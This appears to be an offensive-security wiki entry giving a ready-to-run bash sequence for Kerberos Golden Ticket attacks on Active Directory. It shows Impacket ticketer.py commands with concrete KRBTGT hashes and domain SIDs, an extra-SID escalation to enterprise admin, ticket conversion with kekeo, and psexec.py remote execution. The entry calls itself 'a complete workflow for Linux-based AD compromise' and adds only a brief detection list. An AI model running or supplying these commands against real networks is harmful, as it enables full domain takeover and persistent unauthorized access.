---
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:04.790335+00:00'
updated_at: '2023-04-10T20:26:04.560940+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - golden-ticket
  - script
validated: true
---

# Golden-Ticket-Forging-and-Usage-Sequence

## Code

```bash
# Convert the ticket kirbi to ccache with kekeo
misc::convert ccache ticket.kirbi

# Alternatively you can use ticketer from Impacket
./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da

ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519

export KRB5CCNAME=/home/user/ticket.ccache
cat $KRB5CCNAME

# NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
```

## Description

This bash sequence forges a Golden Ticket using ticketer.py examples, converts formats with Kekeo, sets the ccache environment, displays contents, and executes remote commands with psexec.py. It provides a complete workflow for Linux-based AD compromise.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `$_KRBTGT_NTHASH` | KRBTGT NTLM hash | a577fcf16cfef780a2ceb343ec39a0d9 |
| `$_DOMAIN_SID` | Domain SID | S-1-5-21-2972629792-1506071460-1188933728 |
| `$_DOMAIN_NAME` | Domain FQDN | amity.local |
| `$_USERNAME` | Target user | mbrody-da |
| `$_ENTERPRISE_SID` | Admin group SID | S-1-5-21-...-519 |
| `ticket.kirbi` | Input kirbi file | ticket.kirbi |
| `/home/user/ticket.ccache` | Ccache path | /home/user/ticket.ccache |
| `$_DC_IP` | DC IP | 192.168.1.1 |
| `$_TARGET_IP` | Target host IP | 192.168.1.100 |

## Usage

Run sequentially on a Kali Linux machine after obtaining the KRBTGT hash. Ensure Impacket and Kekeo are in PATH. Use for pass-the-ticket in AD environments; deliver via compromised Linux host.

## Detection

- Monitor for ticketer.py or kekeo.exe processes.
- Kerberos logs showing forged TGTs with infinite lifetimes.
- Unusual psexec connections from Linux IPs to Windows hosts.
- Environment variable changes in process dumps.

## Related

- [[procedures/Forge-and-Use-Golden-Ticket-on-Linux]]
- [[tools/Impacket]]
- [[tools/kekeo]]
